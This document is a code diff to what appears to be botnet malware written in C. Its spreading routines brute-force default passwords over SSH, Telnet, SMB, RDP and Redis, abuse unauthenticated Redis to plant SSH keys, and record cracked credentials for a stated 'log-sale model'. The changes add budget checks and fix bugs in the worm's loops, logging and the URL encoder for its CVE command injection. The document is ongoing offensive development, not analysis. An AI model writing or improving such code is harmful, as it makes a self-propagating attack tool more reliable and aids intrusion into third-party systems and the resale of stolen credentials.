@@ -353,6 +353,20 @@ static int spread_budget_expired(uint64_t start) {
            (long)(get_timestamp_ms() - start) >= g_spread_budget_ms;
 }
 
+/* #252: settle wait that counts against the spread budget (#191). The
+ * fixed 5s usleep() calls blocked the command loop unaccounted; sleep in
+ * 200ms slices instead and stop early once the caller's wall-clock
+ * budget is exhausted. */
+static void spread_budget_sleep(uint64_t budget_start, long total_ms) {
+    long slept = 0;
+    while (slept < total_ms && !spread_budget_expired(budget_start)) {
+        long slice = total_ms - slept;
+        if (slice > 200) slice = 200;
+        usleep((useconds_t)slice * 1000);
+        slept += slice;
+    }
+}
+
 int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->ssh_enabled) return -1;
 
@@ -373,6 +387,12 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
             return -1;
         }
         for (int p = 0; default_passes[p]; p++) {
+            /* #252: check inside the pass loop too — 25 back-to-back
+             * attempts can overshoot the user-loop check by minutes. */
+            if (spread_budget_expired(budget_start)) {
+                log_info("spread: budget exhausted after %u attempts", attempts);
+                return -1;
+            }
             attempts++;
             int sock_fd = try_login_ssh_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock_fd >= 0) {
@@ -549,8 +569,11 @@ int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *use
                 break;
             }
             if (rlen2 + n >= (int)sizeof(resp) - 1) {
-                /* roll the window: keep the last 96 bytes */
-                memmove(resp, resp + 96, 96);
+                /* roll the window: keep the last 96 bytes — #253: the
+                 * tail of rlen2 valid bytes starts at resp + (rlen2-96),
+                 * not resp + 96 (the old fixed offset kept an arbitrary
+                 * mid-buffer slice and discarded the true tail). */
+                memmove(resp, resp + rlen2 - 96, 96);
                 rlen2 = 96;
             }
             memcpy(resp + rlen2, chunk, (size_t)n);
@@ -660,6 +683,12 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
             return -1;
         }
         for (int p = 0; default_passes[p]; p++) {
+            /* #252: check inside the pass loop too — 25 back-to-back
+             * attempts can overshoot the user-loop check by minutes. */
+            if (spread_budget_expired(budget_start)) {
+                log_info("spread: budget exhausted after %u attempts", attempts);
+                return -1;
+            }
             attempts++;
             int sock_fd = try_login_telnet_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock_fd >= 0) {
@@ -1111,6 +1140,12 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
             return -1;
         }
         for (int p = 0; default_passes[p]; p++) {
+            /* #252: check inside the pass loop too — 25 back-to-back
+             * attempts can overshoot the user-loop check by minutes. */
+            if (spread_budget_expired(budget_start)) {
+                log_info("spread: budget exhausted after %u attempts", attempts);
+                return -1;
+            }
             attempts++;
             int sock = try_login_smb_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock < 0) continue;
@@ -1249,21 +1284,25 @@ int exploit_redis_sock(notnet_bot_t *bot, int sock) {
 
 int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->redis_enabled) return -1;
-    
+
     log_info("Redis: unauthenticated access %s:%d", ip, port);
-    
+
+    /* #252: start the budget clock at function entry so the unauth
+     * attempt AND its settle sleep are accounted against it. */
+    uint64_t budget_start = get_timestamp_ms();
+
     /* Try unauthenticated first */
     if (exploit_redis_unauth(bot, ip, port)) {
         log_info("Redis: exploited unauth on %s:%d", ip, port);
-        /* Wait for SSH key to take effect */
-        usleep(5000000); /* 5 seconds */
-        
+        /* Wait for SSH key to take effect — #252: bounded by the spread
+         * budget instead of an unconditional 5s block. */
+        spread_budget_sleep(budget_start, 5000);
+
         /* Now spread via SSH */
         spread_ssh(bot, ip, 22);
         return 0;
     }
-    
-    uint64_t budget_start = get_timestamp_ms();
+
     unsigned int attempts = 0;
 
     /* Try brute-force */
@@ -1274,6 +1313,12 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
             return -1;
         }
         for (int p = 0; default_passes[p]; p++) {
+            /* #252: check inside the pass loop too — 25 back-to-back
+             * attempts can overshoot the user-loop check by minutes. */
+            if (spread_budget_expired(budget_start)) {
+                log_info("spread: budget exhausted after %u attempts", attempts);
+                return -1;
+            }
             attempts++;
             int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
             if (sock < 0) continue;
@@ -1301,12 +1346,18 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
             
             /* AUTH returns +OK on success */
             if (strstr(auth_resp, "+OK")) {
-                log_info("Redis: auth success %s:%d with %s:%s",
-                         ip, port, default_users[u], "***REDACTED***");
+                /* #254: Redis AUTH authenticates with the PASSWORD only —
+                 * no username was ever sent, so do not log or record one.
+                 * Record a fixed marker username; the same working
+                 * password is now recorded once per hit instead of once
+                 * per outer-loop user with fabricated pairs. */
+                log_info("Redis: auth success %s:%d (AUTH password only) "
+                         "***REDACTED***", ip, port);
                 /* #90: harvest the verified credential for the log-sale
                  * model. The unauth-exploit path above records nothing —
                  * there is no credential to sell. */
-                spread_cred_record("redis", ip, port, default_users[u], default_passes[p]);
+                spread_cred_record("redis", ip, port, "<auth-only>",
+                                   default_passes[p]);
                 
                 /* SECURITY FIX (#71): Keep the authenticated socket and
                  * run the CONFIG SET sequence over it. The old code
@@ -1319,7 +1370,8 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 if (exploited > 0) {
                     log_info("Redis: exploited auth on %s:%d", ip, port);
                     close(sock);
-                    usleep(5000000);
+                    /* #252: settle sleep counts against the budget. */
+                    spread_budget_sleep(budget_start, 5000);
                     spread_ssh(bot, ip, 22);
                     return 0;
                 }
@@ -1865,6 +1917,12 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
             return -1;
         }
         for (int p = 0; default_passes[p]; p++) {
+            /* #252: check inside the pass loop too — 25 back-to-back
+             * attempts can overshoot the user-loop check by minutes. */
+            if (spread_budget_expired(budget_start)) {
+                log_info("spread: budget exhausted after %u attempts", attempts);
+                return -1;
+            }
             attempts++;
             int sock = try_login_rdp_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock < 0) continue;
@@ -1992,22 +2050,28 @@ static int cve_urlencode(const char *cmd, char *out, size_t out_len) {
     static const char hex[] = "0123456789ABCDEF";
     if (!cmd || !out || out_len == 0) return -1;
     size_t o = 0;
-    for (size_t i = 0; cmd[i] && o < out_len - 1; i++) {
+    int truncated = 0;   /* #255: honor the documented -1 contract */
+    for (size_t i = 0; cmd[i]; i++) {
         unsigned char c = (unsigned char)cmd[i];
         if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
             (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_' ||
             c == '~') {
+            if (o + 1 > out_len - 1) { truncated = 1; break; }
             out[o++] = (char)c;
-        } else if (o + 2 < out_len) {
+        } else if (o + 3 <= out_len - 1) {
             out[o++] = '%';
             out[o++] = hex[(c >> 4) & 0xF];
             out[o++] = hex[c & 0xF];
         } else {
+            truncated = 1;
             break;
         }
     }
     out[o] = '\0';
-    return (int)o;
+    /* #255: on overflow return -1 so the callers' "command too long"
+     * fail-closed guard actually fires — a truncated positive length
+     * injected garbage instead. */
+    return truncated ? -1 : (int)o;
 }
 
 /* Case-insensitive substring check on a bounded buffer. */
